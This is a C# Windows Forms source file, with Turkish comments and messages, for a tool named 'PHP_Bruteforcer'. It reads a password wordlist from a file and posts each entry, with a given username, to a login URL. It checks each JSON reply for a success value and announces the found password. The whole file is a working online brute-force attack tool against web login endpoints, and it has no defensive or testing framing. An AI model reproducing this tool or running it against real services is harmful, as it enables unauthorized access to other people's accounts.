using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;

namespace PHP_Bruteforcer
{
    public partial class Form1 : Form
    {
        public string dosyayolu;

        public bool bulundu = false;

        public Form1()
        {
            InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            this.BackColor = Color.Red;

            using (var client = new WebClient())
            {
                var values = new NameValueCollection();
                values[textBox5.Text] = textBox2.Text;
                values[textBox6.Text] = "";

                //textBox1.Text += "Denenen şifre: " + item + "\r\n";

                //string[] satırlar = File.ReadAllLines(dosyayolu);
                
                string line;

                var satırlar = new List<string>(); 

                StreamReader file = new StreamReader(dosyayolu);
                
                while ((line = file.ReadLine()) != null)
                {
                    satırlar.Add(line);
                }

                foreach (string satır in satırlar)
                {
                    if (!bulundu)
                    {
                        values[textBox6.Text] = satır;

                        textBox3.AppendText("Denenen şifre: " + satır + "\r\n");

                        try
                        {
                            var response = client.UploadValues(textBox1.Text, values);

                            var responseString = Encoding.UTF8.GetString(response);

                            JObject jo = JObject.Parse(responseString);


                            if (jo[textBox7.Text].ToString() == textBox8.Text) //burayı kendinize göre ayarlıyabilirsiniz (resultType)
                            {
                                bulundu = true;
                                this.BackColor = Color.Lime;
                                textBox3.AppendText("Başarılı: " + responseString + "\r\n");
                                MessageBox.Show("Başardın! Şifre: " + satır);
                            }
                            else
                            {
                                textBox3.AppendText("Başarısız: " + responseString + "\r\n");
                            }

                        }
                        catch (Exception ex)
                        {
                            MessageBox.Show("hata: " + ex);
                        }
                    }  
                }       
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            if (openFileDialog1.ShowDialog() == DialogResult.OK)
            {
                textBox4.Text = openFileDialog1.FileName;
                dosyayolu = openFileDialog1.FileName;
            }
        }
    }
}
